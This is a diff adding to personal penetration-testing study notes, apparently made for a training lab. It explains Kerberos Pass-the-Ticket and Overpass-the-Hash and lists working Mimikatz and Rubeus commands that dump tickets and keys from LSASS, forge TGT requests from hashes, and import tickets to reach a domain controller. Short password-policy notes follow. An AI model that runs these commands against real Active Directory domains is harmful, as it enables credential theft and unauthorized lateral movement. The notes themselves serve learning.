@@ -257,7 +257,69 @@ UAC (User Account Control) limits local users' ability to perform remote adminis
 it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks.  
 Setting it to 1 allows the other local admins as well.  
 
+**Pass the Ticket(PtT) from Windows**: passing stolen kerberos tickets tgts and tgs  
+OverPass-the-Hash Aka pass the key --- instead of passing tgt which expire in 10 hours,  
+We extract the kerberos encryption keys which is basically users password hashes aes/Rc4 stored in lsass for sso  
+this user hash is dumped and used to request the TGT for the user(This is the key used in AS-REQ timestamp encryption to prove users identity)  
+Pass the ticket is stealthier instead of requesting new ticket  
+AD structurally uses the exact same mathematical value for both the NTLM hash and the kerberos RC4 key  
+so this RC4 and NT hasH both are same ... if dumped we could use it to to pass the hash with NTLM  
+If RC4 is disabled domain-wide, KDC will reject the NTLM/Rc4 hash, then we need aes keys instead  
+Dumping the tgt basically dumps just the ticket in .kirb, can simply pass this ticket  
+both kerberos master key and kerberos tickets are stored in lsass memory - need admin to extract  
 
+.kirbi is just a generic file format used by mimikatz and rubeus to save exported kerberos tickets to disk  
+how to tell whether its tgt or tgs ?  
+if the service name targets the krbtgt account this is tgt  
+if the service name targets mssqlsv then its a tgs  
+Rubeus.exe describe /ticket:C:\path\to\ticket.kirbi  //check type look for service name  
+
+....With Mimikatz....  mimikatz.exe  privilege::debug  
+sekurlsa::tickets /export   //harvest tickets //saves tickets as .kirb  
+
+sekurlsa::ekeys  //extract aes/rc4 kerberos keys for overpass-the-hash   
+sekurlsa::pth /domain:soda.com /user:plaintext /ntlm:3f74aa8f0f09cd5177b5c1ce50f  //gets a new tgt from kdc and starts a new cmd.exe in context of target user  
+//Mimikatz doesn't support overpass-the-hash with aes only rc4/ntlm supported, for aes use rubeus  
+
+kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"  
+//pass the ticket  once imported #exit - to exit mimikatz and try c:\tools> dir \\DC01.soda.com\c$  
+//same after mimikatz exit try -- launch powershell and Enter-PSSession -ComputerName DC01  //connects as a kerberos tgt user to the target computer over winrm  
+
+
+.....With Rubeus.....  
+Rubeus.exe dump /nowrap  //harvest tickets, better mimikatz sometime error  //returns base64 encoded ticket  
+Rubeus.exe dump /service:krbtgt /nowrap /filename:C:\Users\Public\      //automatically parses and wites .kirb to the given path  
+
+//rubeus cannot dump the kerberos master encyption keys, so use mimikatz to dump them and use rubeus to overpass-the-aes-hash  
+Rubeus.exe asktgt /domain:soda.om /user:plaintext /aes256:b21c99fc068e312TIMESNTLMa8fda3fe60 /nowrap  
+//overpass-the-hash aes hash using rubeus //prints the ticket in Base64 can use /filename:C:\Users\Public\ to save it as .kirb  
+
+Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt  
+//overpass-the-hash and import target users tgt into the session  
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt   
+//imports the ticket to current logon session //here its overpass-the-hash and import  
+c:\tools> dir \\DC01.soda.com\c$  //as smb/PSexec will alwasy try to use kerberos first if ok OK otherwise NTLM FALLBACK  
+
+
+Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi  
+//pass the ticket extracted and stored in .kirbi  
+c:\tools> dir \\DC01.soda.com\c$  
+ 
+Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBSNIPPED   //pass the ticket using a base64 encoded kirb  
+
+//powershell remoting with rubeus is different, 
+Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show  //this opens a new cmd window  
+//here on new windows pass the hash /ptt using rubeus and then launch powershell and use psremoting as depicted in mimikatz section  
+Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi  
+
+**Password policies**:  
+passwords to expire, account lockout, password strength, password history  
+NIST, CIS and PCI DSS password policy guides  
+use password generators, use multiple words easy still strong because of length  
+
+**Password Managers**:  
+Lastpass, 1Password, Keepass, password safe  
+Alternatives: Go Passwordless, MFA, Justintimeaccess, IP restrictions, deivce compliance enforcement  
 
 
 
